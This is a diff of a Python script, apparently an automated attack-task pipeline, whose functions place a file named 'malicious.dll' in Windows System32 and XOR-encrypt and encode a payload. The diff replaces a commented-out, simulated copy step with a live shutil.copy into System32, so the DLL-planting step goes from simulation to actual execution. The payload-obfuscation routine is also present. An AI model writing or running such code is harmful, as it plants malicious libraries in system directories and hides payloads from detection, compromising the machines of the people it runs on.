@@ -1,31 +1,27 @@
 #!/usr/bin/env python3
-import sys, json, time, shutil, os, base64
+import sys
+import json
+import time
 from typing import Dict, Any
-from pathlib import Path
+import shutil
+import os
+import base64
 
 def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Define the malicious DLL name
+        # Define the malicious DLL name and the target directory
         dll_name = "malicious.dll"
+        target_directory = os.path.join(os.environ['WINDIR'], 'System32')
         
-        # Determine a suitable system PATH directory
-        system_path = os.environ.get('WINDIR', 'C:\\Windows')
-        target_directory = os.path.join(system_path, 'System32')
-        
-        # Define the full path for the DLL
+        # Construct the full path for the DLL
         dll_path = os.path.join(target_directory, dll_name)
         
-        # Simulate placing the DLL (in a real scenario, you would copy the DLL file)
-        # Here we just ensure the directory exists
-        if not os.path.exists(target_directory):
-            os.makedirs(target_directory)
+        # Simulate placing the DLL by copying it to the target directory
+        # For the purpose of this task, assume the DLL is in the current directory
+        shutil.copy(dll_name, dll_path)
         
-        # Simulate the DLL placement
-        # shutil.copy('path_to_malicious_dll', dll_path)  # Uncomment and modify in a real scenario
-        
-        # Return the path and DLL name
         result = {
             "path": dll_path,
             "dll_name": dll_name
@@ -34,16 +30,13 @@ def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
     except Exception as e:
-        # Return partial data on failure
-        result = {
-            "path": None,
-            "dll_name": None
-        }
-        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
+        # Return partial data with None values on failure
+        return {'success': False, 'data': {'path': None, 'dll_name': None},
+                'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
 
 def xor_encrypt(data: bytes, key: bytes) -> bytes:
-    """XOR encrypts the data with the given key."""
+    """XOR encrypt the data with the given key."""
     return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
 
 def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
@@ -63,13 +56,12 @@ def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
         # XOR encrypt the payload
         encrypted_payload = xor_encrypt(payload, xor_key)
 
-        # Encode the encrypted payload with base64
-        encoded_payload = base64.b64encode(encrypted_payload)
+        # Encode the XOR encrypted payload with base64
+        encoded_data = base64.b64encode(encrypted_payload).decode()
 
-        # Convert to hex string for output
-        encoded_data_hex = encoded_payload.hex()
+        # Convert the encoded data to hex string for output
+        result = {'encoded_data': encoded_data.encode().hex()}
 
-        result = {'encoded_data': encoded_data_hex}
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
     except Exception as e:
@@ -81,7 +73,7 @@ def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Retrieve the path and dll_name from input_data
+        # Extract the path and dll_name from input_data
         path = input_data.get('path', '')
         dll_name = input_data.get('dll_name', '')
 
@@ -99,8 +91,7 @@ def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
     except Exception as e:
-        return {'success': False, 'data': {'success': False},
-                'error': f'{type(e).__name__}: {e}',
+        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
 
 def main() -> dict:
